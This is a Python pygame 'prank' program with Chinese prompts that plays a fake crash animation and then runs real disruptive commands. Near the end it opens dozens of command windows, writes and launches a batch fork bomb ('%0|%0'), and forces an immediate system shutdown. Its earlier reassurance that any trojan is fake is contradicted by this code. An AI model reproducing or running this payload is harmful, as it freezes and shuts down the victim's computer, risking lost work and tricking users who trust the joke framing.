import pygame,os
from time import *
import random
k = 0
print('给你3秒，快点退出')
sleep(3)
input('你是宇宙工作室队员吗？（是则回车继续看，不是的话劝你别看）')
input('我求你别看了！（回车继续）')
input('你实在要看，回车！（回车继续）')
input('我求你了！别看了！（回车继续）')
input('看了很惨的！如有木马，那是假的，让你黑屏而已（回车继续）')
input('如果你要吐槽、评论，敬请在这个回车前说完！（回车继续）')
input('我求你别看了！（回车继续）')
input('点赞的话先点，不然你看完就点不到了！（回车继续）')
input('千万注意啊！（回车继续）')
input('你也是厉害，翻到这里！（回车继续）')
input('你不能先看看源码有没有危险吗？（回车继续）')
input('第三次：我求你别看了！（回车继续）')
input('''合同
请最好不要回车了，好吧！
\033[1;31m此次回车给你带来的伤害：
可能会爆炸、卡死、开不出机
将开启100次cmd
从假的动画到真的影响电脑
千万别回车
回车代表您愿意承担所有责任，我们坚决不负责！
回车也代表你绝不举报、不踩
请您做最后的决定！！！''')
input('最后一次机会……⚠ （回车继续）')
print('3秒后开始')
sleep(3)
print('留意窗口，点击窗口屏幕开始')
sleep(3)
pygame.init()
bg = pygame.image.load("死机之歌桌面.png")
bg2 = pygame.image.load("死机之歌欢迎使用.png")
bg3 = pygame.image.load("死机之歌蓝屏.png")
pygame.mixer.music.load('死机之歌.wav')
s1 = pygame.transform.smoothscale(pygame.image.load("1.png"),(213,135))
s2 = pygame.transform.smoothscale(pygame.image.load("2.png"),(155,60))
s3 = pygame.transform.smoothscale(pygame.image.load("3.png"),(213,135))
s4 = pygame.transform.smoothscale(pygame.image.load("4.png"),(210,60))
s5 = pygame.transform.smoothscale(pygame.image.load("5.png"),(165,68))
s6 = pygame.transform.smoothscale(pygame.image.load("6.png"),(219,87))
screen = pygame.display.set_mode((960,720))
pygame.display.set_caption("小轩·死机之歌")
t1 = time()
while True:
    t2 = time()
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()
        if event.type == pygame.MOUSEBUTTONDOWN:
            k = 1
    if k == 1:
        pygame.mixer.music.play()
        screen.blit(bg,(0,0))
        screen.blit(s2,(0,0))
        pygame.display.update()
        sleep(1)
        for i in range(int(round(t2,0))):
            screen.blit(s2,(i*3,i*3))
            sleep(0.1)
            pygame.display.update()
            if i == 44:
                t2=t1
                break
        screen.blit(bg,(0,0))
        pygame.display.update()
        for i in range(int(round(t2,0))):
            screen.blit(s5,(i*3,i*3))
            sleep(0.1)
            pygame.display.update()
            screen.blit(s6,(i*3+10,i*3+20))
            sleep(0.1)
            pygame.display.update()
            if i == 57:
                t2=t1
                break
        screen.blit(bg,(0,0))
        pygame.display.update()
        for i in range(int(round(t2,0))):
            screen.blit(s2,(random.randint(0,805),random.randint(0,660)))
            sleep(0.05)
            pygame.display.update()
            if i == 225:
                break
        screen.blit(bg2,(0,0))
        pygame.display.update()
        sleep(2)
        screen.blit(bg3,(0,0))
        pygame.display.update()
        for i in range(int(round(t2,0))):
            try:
                screen.blit(random.choice([s1,s2,s3,s4,s5,s6]),(random.randint(0,805),random.randint(0,660)))
                sleep(0.05)
                pygame.display.update()
                if i == 550:
                    pygame.quit()
            except:
                pass
input('真的病毒要来的，回车观看')
for i in range(30):
    os.system('start')
sleep(2)
for i in range(30):
    os.system('start')
os.system('shutdown/s')
sleep(2)
os.system('shutdown/a')
for i in range(40):
    os.system('start')
file = open('xxhp.bat','w')
file.write('%0|%0')
file.close()
os.system('start xxhp.bat')
sleep(1)
os.system('shutdown/s /t 0')